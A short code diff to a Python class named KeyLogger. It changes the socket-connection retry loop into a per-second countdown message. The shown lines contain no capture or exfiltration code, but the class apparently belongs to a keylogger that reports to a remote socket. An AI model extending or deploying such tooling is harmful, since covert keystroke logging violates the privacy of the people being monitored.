@@ -25,8 +25,10 @@ class KeyLogger:
                 self.client = ClientSocket()
                 return True
             except:
-                print("Failed setting up socket, trying again in 10 seconds...")
-                time.sleep(10)
+                for i in range(11):
+                    print(f"Failed setting up socket, trying again in {10-i} seconds...", end="\r")
+                    time.sleep(1)
+                print("No connection")
                 continue
 
 
